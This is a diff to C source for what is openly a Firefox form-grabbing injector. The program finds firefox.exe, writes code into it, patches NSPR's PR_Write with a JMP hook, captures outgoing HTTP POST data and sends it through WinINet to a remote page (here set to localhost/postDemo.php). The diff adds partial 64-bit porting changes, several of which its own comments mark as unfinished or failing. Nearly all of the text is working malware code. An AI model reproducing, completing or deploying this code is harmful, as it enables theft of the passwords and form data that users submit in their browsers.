@@ -1,7 +1,9 @@
 #include <stdio.h>
 #include <windows.h>
+#include <string.h>
 #include <Tlhelp32.h>
 #include <wininet.h>
+#include <tchar.h>
 
 // Based on http://www.rohitab.com/discuss/topic/36911-cfirefox-pr-write-hook/
 
@@ -11,7 +13,7 @@
 #define HTTP_REMOTE_SITE	"localhost"
 #define HTTP_REMOTE_PAGE	"/postDemo.php"
 
-#define FIREFOX_PROCESS		"firefox.exe"
+#define FIREFOX_PROCESS		TEXT("firefox.exe")
 #define FIREFOX_PR_WRITE	"PR_Write"
 #define NSPR4_DLL			"nspr4.dll"
 #define WININET_DLL			"wininet.dll"
@@ -26,12 +28,14 @@
 #define HOOK_INT3				0xCC
 #define HOOK_JMP_INST_SIZE		0x01
 #define HOOK_INT3_SIZE			0x01
-#define HOOK_ADDRESS_SIZE		0x04
-#define HOOK_REL_JMP_OFFSET		(HOOK_JMP_INST_SIZE + HOOK_ADDRESS_SIZE)		// 5
-#define HOOK_PARAM1_OFFSET		0x08
-#define HOOK_LOCALVAR1_OFFSET	0x04
+#define HOOK_ADDRESS_SIZE_32	0x04
+#define HOOK_ADDRESS_SIZE_64	0x08
+#define HOOK_REL_JMP_OFFSET_32	(HOOK_JMP_INST_SIZE + HOOK_ADDRESS_SIZE_32)		// 5
+#define HOOK_REL_JMP_OFFSET_64	(HOOK_JMP_INST_SIZE + HOOK_ADDRESS_SIZE_64)		// 9
+#define HOOK_PARAM1_OFFSET_32	0x08
+#define HOOK_LOCALVAR1_OFFSET_32 0x04 // Should be 
 
-#define PR_WRITE_JMP_VP_SIZE	0x06
+#define PR_WRITE_JMP_VP_SIZE	0x06	// 0x0A for 64 bits
 
 typedef HMODULE (WINAPI *FnGetModuleHandle) (LPCTSTR);
 typedef FARPROC (WINAPI *FnGetProcAddress) (HMODULE,LPCSTR);
@@ -47,7 +51,7 @@ typedef struct {
 	FnGetProcAddress fnGetProcAddress;		// GetProcAddress
 	FnVirtualProtect fnVirtualProtect;		// VirtualProtect
 	FnSleep fnSleep;						// Sleep
-	char nameNspr4[36];					// "nspr4.dll" 
+	char nameNspr4[36];						// "nspr4.dll" 
 	char namePR_Write[36];					// "PR_Write"
 	BYTE *PR_Write;
 	BYTE *nptr;
@@ -67,6 +71,7 @@ typedef struct {
 	FnInternetConnect fnInternetConnect;
 	FnHttpOpenRequest fnHttpOpenRequest;
 	FnHttpSendRequest fnHttpSendRequest;
+	int addressSize;						// 4, or 8 on 64 bit CPUs
 } InjectData;
 
 void Hook(InjectData *pData);
@@ -82,9 +87,9 @@ int main() {
 	PROCESSENTRY32 ProcessInfo;
 	ProcessInfo.dwSize = sizeof(PROCESSENTRY32);  
 
-	LoadLibrary( WININET_DLL );
-	wininet = GetModuleHandle( WININET_DLL );
-	kernel32 = GetModuleHandle( KERNEL32_DLL );
+	LoadLibraryA( WININET_DLL );
+	wininet = GetModuleHandleA( WININET_DLL );
+	kernel32 = GetModuleHandleA( KERNEL32_DLL );
 	data.fnGetModuleHandle		= (FnGetModuleHandle) GetProcAddress( kernel32,"GetModuleHandleA" );
 	data.fnGetProcAddress		= (FnGetProcAddress) GetProcAddress(  kernel32,	"GetProcAddress" );
 	data.fnVirtualProtect		= (FnVirtualProtect) GetProcAddress(  kernel32,	"VirtualProtect" );
@@ -93,17 +98,19 @@ int main() {
 	data.fnInternetConnect					= (FnInternetConnect) GetProcAddress( wininet,	"InternetConnectA" );
 	data.fnHttpOpenRequest		= (FnHttpOpenRequest) GetProcAddress( wininet,	"HttpOpenRequestA" );
 	data.fnHttpSendRequest		= (FnHttpSendRequest) GetProcAddress( wininet,	"HttpSendRequestA" ); 
-	wsprintf( data.nameNspr4,		NSPR4_DLL );
-	wsprintf( data.namePR_Write,	FIREFOX_PR_WRITE );
-	wsprintf( data.remoteSite,		HTTP_REMOTE_SITE );
-	wsprintf( data.post,			HTTP_POST );
-	wsprintf( data.pageName,		HTTP_REMOTE_PAGE);
-	wsprintf( data.header,			HTTP_POST_HEADER );
-	wsprintf( data.blank,			"");
+	strcpy( data.nameNspr4,		NSPR4_DLL );
+	strcpy( data.namePR_Write,	FIREFOX_PR_WRITE );
+	strcpy( data.remoteSite,		HTTP_REMOTE_SITE );
+	strcpy( data.post,			HTTP_POST );
+	strcpy( data.pageName,		HTTP_REMOTE_PAGE);
+	strcpy( data.header,			HTTP_POST_HEADER );
+	strcpy( data.blank,			"");
+	data.addressSize			= sizeof( BYTE * );	// size  of a pointer
 
 	while(Process32Next(handle, &ProcessInfo))
 	{
-		if(!strcmp(ProcessInfo.szExeFile, FIREFOX_PROCESS))
+		// strcmp on ANSI, wcscmp on UNICODE
+		if(! _tcscmp(ProcessInfo.szExeFile, FIREFOX_PROCESS))
 		{
 			HANDLE firefoxHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, ProcessInfo.th32ProcessID);
             
@@ -131,18 +138,18 @@ void Hook( InjectData *pData ) {
 Hooked:
 
 	__asm{
-		mov ecx,[esp + HOOK_ESP_DATA_SIZE]	// param data size
-		mov eax,[esp + HOOK_ESP_DATA_OFFSET]// param data
+		mov ecx, [esp + HOOK_ESP_DATA_SIZE]	// param data size
+		mov eax, [esp + HOOK_ESP_DATA_OFFSET]// param data
 
 		cmp dword ptr[eax], HOOK_POST_CMP // POST?
 		jne prexJMP						// it is not POST
 										// it is POST
-		sub esp, HOOK_PARAM1_OFFSET		// Alloc space for pData
+		sub esp, HOOK_PARAM1_OFFSET_32	// Alloc space for pData
 										// this avoids overwriting PR_Write params with Hook param pData
 										// See http://www.unixwiz.net/techtips/win32-callconv-asm.html
 		push ebp						// Save ebp register
 		mov ebp, esp					// Place ebp at esp
-		sub esp, HOOK_LOCALVAR1_OFFSET 	// Alloc 4 bytes on stack for temp local variable
+		sub esp, HOOK_LOCALVAR1_OFFSET_32 	// Alloc 4 bytes on stack for temp local variable
 		push ecx						// save param data size
 		push eax						// save param data
 		call getDelta4					// get the delta, &newtInstruction follows this call
@@ -177,27 +184,32 @@ Hooked:
 
 	__asm{ 
 		nop
-		add esp, HOOK_LOCALVAR1_OFFSET	
+		add esp, HOOK_LOCALVAR1_OFFSET_32	
 		pop ebp							// reset state of ebp and esp
-		add esp, HOOK_PARAM1_OFFSET
+		add esp, HOOK_PARAM1_OFFSET_32
 		nop
 	}
 
 prexJMP:
 	__asm{
-		// Execute the 2 instructions that were overwritten by the JMP LOC instruction (TOTAL = 6 bytes)
+		// Execute the 2 instructions that were overwritten by the JMP LOC instruction (TOTAL = 6 bytes on 32 bit machines, 10 bytes on 64 bit machines ???????)
 		MOV EAX, DWORD PTR [ESP + HOOK_ESP_ARG_0]
 		MOV ECX, DWORD PTR [EAX] 
 	}
 xJMP:
 	__asm{ jmp ExitProcess }
 data:
-	// Will contain pData (pointer size = 4 bytes). See: A.0.0
+	// Will contain pData (pointer size = 4 bytes, or 8 bytes for 64 bits CPUs). See: A.0.0
 	__asm{ 
 		nop
 		nop
 		nop
 		nop
+
+/*		nop
+		nop
+		nop
+		nop*/
 	}
 
 start:
@@ -222,28 +234,29 @@ start:
 
 	pData->nptr = temp;					
 	pData->nptr = (BYTE*)(pData->nptr - pData->PR_Write);
-	pData->nptr = pData->nptr - HOOK_REL_JMP_OFFSET;	// nptr = &Hooked - 5 relative to PR_Write
+	pData->nptr = pData->nptr - HOOK_REL_JMP_OFFSET_32;	// nptr = &Hooked - 5 relative to PR_Write
 
 	*pData->PR_Write = HOOK_JMP;		// Replace PR_Write first instruction by a JMP
 		
-	// This line might will firefox
+	// This line will crash firefox
 	// avoid doing + n to a pointer. Compiler fault ?
 	// *(pData->PR_Write + 1) = (DWORD) pData->nptr;
 		
 	// The following code 
-	// JMP relativeAddress	( size = 1 + 4 )
+	// JMP relativeAddress	( size = 1 + 4 (or 8) )
 	// INT 3				( size = 1 )
-	// --> TOTAL SIZE = 6 bytes
+	// --> TOTAL SIZE = 6 bytes (or 10 bytes for 64 bit CPUs)
 	// ---- replaces
-	// mov     eax, [esp+arg_0]	(size = 4)
+	// mov     eax, [esp+arg_0]	(size = 4 (or 8) )
 	// mov     ecx, [eax]		(size = 1)
-	// --> TOTAL_SIZE = 6 bytes
+	// --> TOTAL_SIZE = 6 bytes (or 10 bytes for 64 bit CPUs)
         
 	pData->PR_Write		+= HOOK_JMP_INST_SIZE;
     pData->bptr			= (DWORD*) pData->PR_Write;	
     *pData->bptr		= (DWORD) pData->nptr;		// JMP to &Hooked --> relative to next instruction @ PR_Write + 4 + 1
 
-    pData->PR_Write		= pData->PR_Write + HOOK_ADDRESS_SIZE;
+	//pData->PR_Write		= pData->PR_Write + HOOK_ADDRESS_SIZE_32;
+	pData->PR_Write	+= HOOK_ADDRESS_SIZE_32;
     *pData->PR_Write	= HOOK_INT3;				// Place a software breakpoint as the next instruction
 	pData->PR_Write		+= HOOK_INT3_SIZE;
 
@@ -263,7 +276,8 @@ start:
 
 	pData->nptr = temp;
 	pData->PR_Write = (BYTE*)(pData->PR_Write - pData->nptr);		// point to instruction after INT 3, relative to &xJMP
-	pData->PR_Write = pData->PR_Write - HOOK_REL_JMP_OFFSET;		// Reduce offset of JMP + JMP_ADDRESS (1+4 bytes)
+	pData->PR_Write = pData->PR_Write - HOOK_REL_JMP_OFFSET_32;
+//	pData->PR_Write = pData->PR_Write - pData->addressSize;			// Reduce offset of JMP + JMP_ADDRESS (1+4 bytes) <-- this fails
 	pData->nptr ++;													// nptr point to ExitProcess
 	// ExitProcess address can be executed
 	pData->fnVirtualProtect(pData->nptr, 10, PAGE_EXECUTE_READWRITE, &pData->oldProtectValue);
